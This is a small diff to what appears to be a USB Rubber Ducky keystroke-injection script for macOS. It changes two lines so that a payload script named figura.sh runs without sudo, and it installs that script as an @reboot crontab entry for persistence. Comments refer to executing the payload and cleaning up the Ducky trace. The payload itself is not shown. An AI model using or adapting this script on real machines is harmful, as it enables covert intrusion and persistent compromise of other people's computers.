@@ -26,13 +26,13 @@ DELAY 1000
 
 REM Execute the payload
 DELAY 500
-TYPE "sudo ./figura.sh"
+TYPE "./figura.sh"
 ENTER
 DELAY 2000
 
 REM Optionally, set persistence (add to cron or launchd, depending on preference)
 DELAY 500
-TYPE "echo '@reboot sudo /Users/$USER/Documents/figura.sh' | crontab -"
+TYPE "echo '@reboot /Users/$USER/Documents/figura.sh' | crontab -"
 ENTER
 
 REM Clean up the Ducky trace
